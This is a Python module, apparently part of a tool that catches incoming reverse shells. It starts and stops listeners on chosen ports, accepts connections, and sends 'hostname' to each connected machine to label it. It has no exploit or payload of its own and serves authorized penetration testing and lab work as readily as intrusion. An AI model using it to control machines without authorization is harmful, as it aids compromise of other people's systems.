import socket
import time
import sys
from colorama import Fore, init
import connection
import threading
import argparse

#make sure colors work properly in Windows
if sys.platform == 'win32' or sys.platform == 'win64':
    init(convert=True)

host = ''
port = ''
sockets = []
ports = []

args = ''
description = 'start listener on specified port'

#this is what's used to actually call the module in server.py
cmdstring = 'listener'

#run module
def execute(cmd):
    cmd = cmd.split(cmdstring)[1].lstrip().split()
    if parse(cmd):
        try: 
            command()
        except Exception as e:
            print_error(e)

#what happens when module is run
def command():
    global sockets
    global ports

    #attempt to start a listener if port is available
    if args.action == 'start':
        if port in ports:
            print_error('There is already a listener on that port!')
        else:
            bind()

    #kill a listener
    elif args.action == 'stop':
        try:
            if port in ports:
                i = ports.index(port)

                #cleanup time!
                sockets[i].close()
                del sockets[i]
                del ports[i]

                time.sleep(1)
                print_notification('Successfully terminated listener on port ' + str(port))
            else:
                print_error('There is no listener on that port!')
        except Exception as e:
            print_error(e)

    #show all listeners in pretty format
    elif args.action == 'show':
        print(Fore.LIGHTCYAN_EX + '\n--------- Ports ---------\n' + Fore.RESET, end='')
        for p in ports:
            print(Fore.LIGHTYELLOW_EX + '--> ' + str(p) + Fore.RESET)
        print(Fore.LIGHTCYAN_EX + '-------------------------\n' + Fore.RESET)

#bind port and socket
def bind():
    global sockets
    global ports

    try:
        s = socket.socket()

    except socket.error as msg:
        print(Fore.LIGHTRED_EX + "[!] Socket creation error: " + msg + Fore.RESET)

    try:
        s.bind((host,port))
        
        sockets.append(s)
        ports.append(port)
        s.settimeout(1)

        #use threads!
        t = threading.Thread(target=listen, args=(s,))
        t.daemon = True
        t.start()
        print_notification('Listening for incoming connections on port ' + str(port))

    except:
        print_error('Error binding socket! Is socket already listening?')
        return

#what happens once we start the listeners
def listen(s):
    global sockets
    global ports

    s.listen(5)

    while True:
        try:
            #can't get in
            if(s._closed):
                break

            #connect to host
            try:
                conn, address = s.accept()
            except:
                continue

            conn.setblocking(0)

            connection.connections.append(conn)
            connection.addresses.append(address)
            ip = conn.getsockname()[0]
   
            #notify upon successful connection
            print(Fore.LIGHTYELLOW_EX +  "\n[+] Connection recieved from " + address[0] + ' on port ' + str(s.getsockname()[1]) + Fore.LIGHTCYAN_EX + '\n' + Fore.RESET, end='')

            #run some commands to get ourselves a nice little prompt and record hostname
            try:
                connection.recieve_immediately(conn)
                conn.send(str.encode('hostname\n'))
                hostname = connection.recieve_immediately(conn).split('\n')[0]
                hostname = hostname.strip('\r')

            #couldn't get the hostname :/
            except:
                print_error('Error getting hostname for ' + address[0] + '!')
                hostname = 'unknown'

            connection.hostnames.append(hostname)

        except Exception as e:
            print_error(e)
            pass

#just some color coding 
def print_error(error):
    print(Fore.LIGHTRED_EX + '[!] ' + error + Fore.RESET)

def print_notification(notification):
    print(Fore.LIGHTYELLOW_EX + '[+] ' + notification + Fore.RESET)

#handle argument parsing for the module
def parse(cmd):
    global port
    global args

    try:
        parser = argparse.ArgumentParser()
        subparsers = parser.add_subparsers(help='add or remove listeners')

        add = subparsers.add_parser('add', help='add a listener')
        add.add_argument(dest='port', type=int, help='specify port')
        add.set_defaults(action='start')

        remove = subparsers.add_parser('remove', help='remove a listener')
        remove.add_argument(dest='port', type=int, help='specify port')
        remove.set_defaults(action='stop')

        show = subparsers.add_parser('show', help='show active listeners')
        show.set_defaults(action='show')


        if len(cmd) == 0:
            parser.print_help()
            print()
            return False

        args = parser.parse_args(cmd)
        
        if hasattr(args,'port'):
            port = args.port

        return True
    except:
        print()
        return False
